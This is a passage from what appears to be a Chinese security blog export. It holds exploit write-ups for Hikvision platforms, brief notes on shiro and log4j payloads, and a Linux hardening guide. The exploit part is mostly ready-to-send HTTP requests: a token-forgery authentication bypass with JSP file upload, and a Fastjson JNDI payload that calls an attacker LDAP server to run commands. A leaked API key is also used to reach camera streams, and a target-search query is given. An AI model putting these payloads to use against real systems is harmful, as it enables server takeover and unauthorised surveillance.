<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /eps/api/resourceOperations/upload?token=构造的token值 HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: ISMS_8700_Sessionname=A29E70BEA1FDA82E2CF0805C3A389988</span><br><span class="line">Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo</span><br><span class="line">Upgrade-Insecure-Requests: 1Content-Length: 174</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryGEJwiloiPo</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;fileUploader&quot;</span>;filename=<span class="string">&quot;1.jsp&quot;</span></span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span></span><br><span class="line">------WebKitFormBoundaryGEJwiloiPo</span><br></pre></td></tr></table></figure>

<p>构造token绕过认证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /eps/api/resourceOperations/upload HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://you-ip</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: ISMS_8700_Sessionname=7634604FBE659A8532E666FE4AA41BE9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 62</span><br><span class="line"></span><br><span class="line">service=http%3A%2F%2Fx.x.x.x%3Ax%2Fhome%2Findex.action</span><br></pre></td></tr></table></figure>

<p>构造token绕过认证  （内部机制：如果token值与请求url+secretkey的md5值相同就可以绕过认证）</p>
<p>secretkey是代码里写死的（默认值：secretKeyIbuilding）</p>
<p>token值需要进行MD5加密（32位大写）</p>
<p>组合：token&#x3D;MD5(url+”secretKeyIbuilding”)</p>
<blockquote>
<p>md5加密 ：<a href="http://x.x.x//eps/api/resourceOperations/uploadsecretKeyIbuilding">http://x.x.x//eps/api/resourceOperations/uploadsecretKeyIbuilding</a></p>
</blockquote>
<p>重新验证，构造文件上传poyload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">POST /eps/api/resourceOperations/upload?token=构造的token值 HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: ISMS_8700_Sessionname=A29E70BEA1FDA82E2CF0805C3A389988</span><br><span class="line">Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 174</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryGEJwiloiPo</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileUploader&quot;;filename=&quot;1.jsp&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">test</span><br><span class="line">------WebKitFormBoundaryGEJwiloiPo</span><br></pre></td></tr></table></figure>

<p>显示上传成功且返回了resourceUuid值</p>
<p>验证路径：<a href="http://url/eps/upload/resourceUuid%E7%9A%84%E5%80%BC.jsp">http://url/eps/upload/resourceUuid的值.jsp</a></p>
<h4 id="海康威视IVMS系统任意文件上传漏洞"><a href="#海康威视IVMS系统任意文件上传漏洞" class="headerlink" title="海康威视IVMS系统任意文件上传漏洞"></a><strong>海康威视IVMS系统任意文件上传漏洞</strong></h4><p><strong>检测POC</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/sccmdaveli/hikvision-poc</span><br></pre></td></tr></table></figure>

<p><strong>漏洞修复</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1.</span>在服务器后端控制上传文件类型，处理时强制使用随机数改写文件名和文件路径,不要使用用户自定义的文件名和文件路径。</span><br><span class="line"><span class="number">2.</span>在服务器后端建议使用白名单的方法对上传的文件进行过滤，上传的目录不进行解析，只提供下载权限。</span><br><span class="line"><span class="number">3.</span>开源编辑器上传漏洞：若新版编辑器已修复漏洞，请更新编辑器版本。</span><br><span class="line"><span class="number">4.</span>除了以上的方法之外，还可将被上传的文件限制在某一路径下，并在文件上传目录禁止脚本解析。</span><br><span class="line"></span><br><span class="line">参考代码：</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.security.SecureRandom;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Part;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileUploadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ALLOWED_FILE_TYPES</span> <span class="operator">=</span> <span class="string">&quot;image/jpeg,image/png,image/gif&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">SecureRandom</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecureRandom</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">      <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="comment">// 获取上传的文件</span></span><br><span class="line">    <span class="type">Part</span> <span class="variable">filePart</span> <span class="operator">=</span> request.getPart(<span class="string">&quot;file&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查文件类型是否被允许</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">fileType</span> <span class="operator">=</span> filePart.getContentType();</span><br><span class="line">    <span class="keyword">if</span> (!ALLOWED_FILE_TYPES.contains(fileType)) &#123;</span><br><span class="line">      response.sendError(HttpServletResponse.SC_BAD_REQUEST, <span class="string">&quot;Invalid file type.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用随机数改写文件名和文件路径</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> generateRandomFileName(filePart.getSubmittedFileName());</span><br><span class="line">    <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> request.getServletContext().getRealPath(<span class="string">&quot;/&quot;</span>) + File.separator + <span class="string">&quot;uploads&quot;</span> + File.separator + fileName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存文件</span></span><br><span class="line">    filePart.write(filePath);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回响应</span></span><br><span class="line">    response.setStatus(HttpServletResponse.SC_OK);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">generateRandomFileName</span><span class="params">(String fileName)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">randomNumber</span> <span class="operator">=</span> random.nextInt();</span><br><span class="line">    String[] fileNameParts = fileName.split(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">fileExtension</span> <span class="operator">=</span> fileNameParts[fileNameParts.length - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> randomNumber + <span class="string">&quot;.&quot;</span> + fileExtension;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">在上面的代码中，我们首先使用 getPart 方法获取上传的文件。然后检查文件类型是否在允许的文件类型列表中。如果不在，则发送错误响应。否则，我们使用随机数改写文件名和文件路径。最后，我们使用 write 方法将文件写入磁盘，并返回响应。</span><br></pre></td></tr></table></figure>

<h4 id="海康威视综合安防管理平台存在Fastjson远程命令执行漏洞（2022-HVV洞）"><a href="#海康威视综合安防管理平台存在Fastjson远程命令执行漏洞（2022-HVV洞）" class="headerlink" title="海康威视综合安防管理平台存在Fastjson远程命令执行漏洞（2022 HVV洞）"></a><strong>海康威视综合安防管理平台存在Fastjson远程命令执行漏洞（2022 HVV洞）</strong></h4><p><strong>漏洞描述</strong></p>
<p>海康威视综合安防管理平台存在Fastjson远程命令执行漏洞，该漏洞可执行系统命令，直接获取服务器权限。</p>
<p><strong>搜索引擎语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;HIKVISION-综合安防管理平台&quot;</span><br></pre></td></tr></table></figure>

<p><strong>poc</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /bic/ssoService/v1/applyCT HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Dnt: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Te: trailers</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 215</span><br><span class="line"></span><br><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://2vyvoa.dnslog.cn&quot;,&quot;autoCommit&quot;:true&#125;,&quot;hfe4zyyzldp&quot;:&quot;=&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>先看看能不能连dnslog服务器，如果dnslog服务器收到请求，则大概率存在命令执行漏洞 </p>
<p>确定dnslog能收到请求之后，使用工具JNDIExploit-1.2-SNAPSHOT.jar 进一步利用。把该工具上传到公网服务器后，执行如下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 你的公网服务器ip</span><br></pre></td></tr></table></figure>

<p>记得对外开放1389 8080端口哦 </p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185125656.png" alt="image-20230613185125656"></p>
<p>然后就在数据包的头部加上 cmd: whoami  这里whoami也可以改成你想执行的命令</p>
<p>存在注入的地方改成  ldap:&#x2F;&#x2F;这里是的你公网服务器ip地址:1389&#x2F;Basic&#x2F;TomcatEcho</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">POST /bic/ssoService/v1/applyCT HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Dnt: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Te: trailers</span><br><span class="line">Content-Type: application/json</span><br><span class="line">cmd: whoami</span><br><span class="line">Content-Length: 215</span><br><span class="line"></span><br><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://这里是的你公网服务器ip地址:1389/Basic/TomcatEcho&quot;,&quot;autoCommit&quot;:true&#125;,&quot;hfe4zyyzldp&quot;:&quot;=&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>成功执行whoami</p>
<p><strong>漏洞修复</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.hikvision.com/cn/support/CybersecurityCenter/SecurityNotices/</span><br></pre></td></tr></table></figure>

<h4 id="海康威视AK信息泄露漏洞"><a href="#海康威视AK信息泄露漏洞" class="headerlink" title="海康威视AK信息泄露漏洞"></a><strong>海康威视AK信息泄露漏洞</strong></h4><p>进行js多次查看发现存在jsconfig的调用。</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185345443.png" alt="image-20230613185345443"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185405052.png" alt="image-20230613185405052"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185415011.png" alt="image-20230613185415011"></p>
<p>appkey就是user 由一个8位数数构成:23412412</p>
<p>Secret就是passwd，由21位的密钥构成:QfQPss5GOac9Bjxkfuv3</p>
<p>官方提供api接口文档</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://open.hikvision.com/docs/docId?productId=5c67f1e2f05948198c909700&amp;version=%2Ff95e951cefc54578b523d1738f65f0a1&amp;curNodeId=16741aecc05944a6b0cd1341d68e4546</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1./api/resource/v2/encodeDevice/search接口,获取权限的编码设备列表</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2./api/resource/v1/cameras 获取cameraIndexCode</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3./api/video/v1/manualCapture 带cameraIndexCode去获取摄像头的Picurl</span><br></pre></td></tr></table></figure>

<p><strong>利用rtsp协议去访问</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用/api/video/v2/cameras/previewURLs 接口 。获取获取rtsp协议摄像</span><br></pre></td></tr></table></figure>

<p><strong>这里借助借助VLC media player 播放去访问rtsp协议摄像头</strong></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185641997.png" alt="image-20230613185641997"></p>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>代码演示</title>
    <url>/2023/06/11/%E6%BC%94%E7%A4%BA/%E6%BC%94%E7%A4%BA/</url>
    <content><![CDATA[<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span> ()&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h1><p>json格式的数据，@type，rmi和一些出网行为<br>shiro<br>550<br>cookie中的rememberme&#x3D;deleteme<br>命令-序列化-AES加密-&gt;base64-&gt;rememberme<br>721<br>AES-128-CBC  加密的cookike  rememberme 不要key<br>通过padding 加密生成的代码构造rememberme<br>log4j<br>{jndi:ldap&#x2F;&#x2F;}<br>{jndi:rmi&#x2F;&#x2F;}</p>
]]></content>
      <categories>
        <category>测试</category>
      </categories>
      <tags>
        <tag>配置</tag>
        <tag>演示</tag>
      </tags>
  </entry>
  <entry>
    <title>加固和应急响应</title>
    <url>/2023/06/16/%E5%8A%A0%E5%9B%BA%E5%92%8C%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
    <content><![CDATA[<h4 id="加固"><a href="#加固" class="headerlink" title="加固"></a>加固</h4><p>国标</p>
<p>GB&#x2F;T25058 信息安全技术 信息系统安全等级保护实施指南</p>
<p>GB&#x2F;T22240 信息安全技术 信息系统安全等级保护定级指南</p>
<p>GB&#x2F;T22239 信息安全技术 网络安全等级保护基本要求</p>
<p>GB&#x2F;T25070 信息安全技术 网络安全等级保护安全设计技术要求</p>
<p>GB&#x2F;T28449 信息安全技术  网络安全等级保护评测过程指南</p>
<h5 id="版本升级"><a href="#版本升级" class="headerlink" title="版本升级"></a>版本升级</h5><p>windows有弹框，linux没提示</p>
<h5 id="关闭端口服务"><a href="#关闭端口服务" class="headerlink" title="关闭端口服务"></a>关闭端口服务</h5><p>端口能不开就不开，最小安装原则</p>
<h5 id="修改配置项"><a href="#修改配置项" class="headerlink" title="修改配置项"></a>修改配置项</h5><p>修改安全配置，参数，可以为网络和 应用提供必要的安全防护</p>
<h5 id="主机和网络ACL策略"><a href="#主机和网络ACL策略" class="headerlink" title="主机和网络ACL策略"></a>主机和网络ACL策略</h5><p>iptables,对于流量进行严格的控制，白名单</p>
<h5 id="修改代码"><a href="#修改代码" class="headerlink" title="修改代码"></a>修改代码</h5><h5 id="部署设备防护"><a href="#部署设备防护" class="headerlink" title="部署设备防护"></a>部署设备防护</h5><h4 id="linux加固方向"><a href="#linux加固方向" class="headerlink" title="linux加固方向"></a>linux加固方向</h4><h5 id="账号管理和认证授权"><a href="#账号管理和认证授权" class="headerlink" title="账号管理和认证授权"></a>账号管理和认证授权</h5><h6 id="修改目录权限"><a href="#修改目录权限" class="headerlink" title="修改目录权限"></a>修改目录权限</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 750 directory</span><br><span class="line"><span class="comment"># 默认目录权限是755   文件权限是644</span></span><br><span class="line"><span class="comment"># 改为750 640或者 700 600 </span></span><br><span class="line"><span class="built_in">chown</span> username:groupname directory</span><br><span class="line"></span><br><span class="line"><span class="comment">#更改账户组文件的权限</span></span><br><span class="line"><span class="built_in">chmod</span> 644 /etc/passwd</span><br><span class="line"><span class="built_in">chmod</span> 600 /etc/shadow</span><br><span class="line"><span class="built_in">chmod</span> 644 /etc/group</span><br><span class="line"><span class="comment">#去除多余的写入操作  全改</span></span><br><span class="line"><span class="built_in">chmod</span> -R go-w /etc</span><br></pre></td></tr></table></figure>

<p>visudo</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#visudo中  !以后的为不允许使用该命令</span></span><br><span class="line">username   host=/usr/sbin/useradd, !/usr/bin/vim /etc/hosts,!/usr/bin/passwd root</span><br></pre></td></tr></table></figure>

<p>检查高权限文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.find / -type f \( -perm -00007 \) -a -ctime -1 -exec ls -lg &#123;&#125; \;</span><br><span class="line">ctime -1 :一天内状态改变过的项</span><br><span class="line">mtime:内容修改</span><br><span class="line">atime:被访问</span><br></pre></td></tr></table></figure>

<h6 id="禁止任何人su为root账户"><a href="#禁止任何人su为root账户" class="headerlink" title="禁止任何人su为root账户"></a>禁止任何人su为root账户</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改su的配置为配置文件</span></span><br><span class="line">/etc/pam.d/su</span><br><span class="line">	auth  sufficient   /lib/security/pam.rootok.so</span><br><span class="line">	auth  required     /lib/security/pam_wheel.so</span><br><span class="line">	group=wheel</span><br><span class="line"><span class="comment">#如果需要su切换，将用户加入wheel组</span></span><br><span class="line">gpasswd -a username wheel</span><br></pre></td></tr></table></figure>



<h6 id="去除不需要的账号，修改默认账号shell环境"><a href="#去除不需要的账号，修改默认账号shell环境" class="headerlink" title="去除不需要的账号，修改默认账号shell环境"></a>去除不需要的账号，修改默认账号shell环境</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#删除/锁定多余的用户与组</span></span><br><span class="line">userdel -r username</span><br><span class="line">groupdel groupname</span><br><span class="line">passwd -l username</span><br><span class="line"><span class="comment">#修改程序账户的登录shell</span></span><br><span class="line">usermod -s /sbin/nologin username</span><br></pre></td></tr></table></figure>

<h6 id="限制超级管理员远程登录"><a href="#限制超级管理员远程登录" class="headerlink" title="限制超级管理员远程登录"></a>限制超级管理员远程登录</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改远程管理程序ssh的配置文件</span></span><br><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line">   permitRootLogin <span class="built_in">yes</span></span><br><span class="line">   ↓</span><br><span class="line">   permitRootLogin no</span><br><span class="line"><span class="comment">#重启sshd服务</span></span><br><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure>

<h6 id="去掉所有suid和sgid"><a href="#去掉所有suid和sgid" class="headerlink" title="去掉所有suid和sgid"></a>去掉所有suid和sgid</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 防止提权</span><br><span class="line">#查找具有suid和sgid的对象</span><br><span class="line">find / -type f \( -perm -04000 -o -perm -02000 \) -exec ls -lg &#123;&#125; \;</span><br><span class="line">find / -type f \( -perm -04000 -o -perm -02000 \) |xargs -l &#123;&#125; ls -lh &#123;&#125;</span><br><span class="line">chmod ugo-s 对象</span><br></pre></td></tr></table></figure>



<h6 id="删除root以外UID为0的用户"><a href="#删除root以外UID为0的用户" class="headerlink" title="删除root以外UID为0的用户"></a>删除root以外UID为0的用户</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#检查哪些账户的UID为0</span></span><br><span class="line">awk -F: <span class="string">&#x27;($3 == 0) &#123; print $1 &#125;&#x27;</span> /etc/passwd</span><br></pre></td></tr></table></figure>

<p>删除账户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">userdel -r username</span><br></pre></td></tr></table></figure>

<p>或者编辑passwd与shadow文件</p>
<h6 id="不应存在位于高权组的账户"><a href="#不应存在位于高权组的账户" class="headerlink" title="不应存在位于高权组的账户"></a>不应存在位于高权组的账户</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 检查哪些账户属于其他组</span></span><br><span class="line">grep -v ^<span class="comment"># /etc/login.defs |grep &quot;^GID_MIN&quot; | awk &#x27;&#123;print $2&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">awk -F: <span class="string">&#x27;$3&gt;500&#123;print $1&#125;&#x27;</span> /etc/passwd |xargs -I &#123;&#125; grep &#123;&#125; /etc/group</span><br><span class="line"></span><br><span class="line">grep -v <span class="string">&quot;/sbin/nologin&quot;</span> /etc/passwd | awk -F: <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I &#123;&#125; grep &#123;&#125; /etc/group</span><br></pre></td></tr></table></figure>

<h6 id="缩短默认密码生存周期"><a href="#缩短默认密码生存周期" class="headerlink" title="缩短默认密码生存周期"></a>缩短默认密码生存周期</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改文件密码策略文件</span></span><br><span class="line">vi /etc/login.defs</span><br><span class="line">	PASS_MAX_DAYS 90   	<span class="comment">#最长使用期限90天</span></span><br><span class="line">	PASS_MIN_DAYS 0     <span class="comment">#最短使用期限0天</span></span><br><span class="line">	PASS_MIN_LEN  8     <span class="comment">#密码最小长度8位</span></span><br><span class="line">	PASS_WARN_AGE 7     <span class="comment">#最长期限到期前7天提醒更改密码</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6 id="设置密码强度策略"><a href="#设置密码强度策略" class="headerlink" title="设置密码强度策略"></a>设置密码强度策略</h6><p>目的：规范使用高强度密码，延长被爆破的时间</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改pam认证文件</span></span><br><span class="line">vi /etc/pam.d/system-auth</span><br><span class="line">	password requisite, pam_cracklib.so</span><br><span class="line">	try_first_pass retry=3 dcredit=-1 1credit=-1</span><br><span class="line">	ucredit=-1 ocredit=-1 minclass=3 minlen=8</span><br><span class="line"></span><br><span class="line"><span class="comment">#centos7以后设置密码复杂度</span></span><br><span class="line">authconfig --passminlen=8 --update    <span class="comment"># 密码最短八位</span></span><br><span class="line">authconfig --enablereqlower --update  <span class="comment">#包含一个小写</span></span><br><span class="line">authconfig --enablerequpper --update  <span class="comment">#包含一个大写</span></span><br><span class="line">authconfig --enablereqdigit --update  <span class="comment">#包含一个数字</span></span><br><span class="line">authconfig --enablereqother --update  <span class="comment">#包含一个字符</span></span><br><span class="line"></span><br><span class="line">在文件/etc/security/pwquality.conf</span><br></pre></td></tr></table></figure>

<h6 id="设置强制密码历史"><a href="#设置强制密码历史" class="headerlink" title="设置强制密码历史"></a>设置强制密码历史</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改pam认证文件</span></span><br><span class="line">/etc/pam.d/system-auth</span><br><span class="line">	password sufficient pam_unix.so sha512 shadow</span><br><span class="line">	nullok try_first_pass use_authtok remember=5</span><br></pre></td></tr></table></figure>

<h6 id="设置账户锁定策略"><a href="#设置账户锁定策略" class="headerlink" title="设置账户锁定策略"></a>设置账户锁定策略</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改pam认证文件</span></span><br><span class="line">/etc/pam.d/system-auth</span><br><span class="line">/etc/pam.d/sshd</span><br><span class="line">/etc/pam.d/login</span><br><span class="line">	auth required pam_tally2.so deny=6</span><br><span class="line">	unlock_time=300 even_deny_root</span><br><span class="line">	root_unlock_time=60</span><br><span class="line"><span class="comment">#强制解锁账户的命令</span></span><br><span class="line">pam_tally2 --user zhangsan --reset</span><br></pre></td></tr></table></figure>

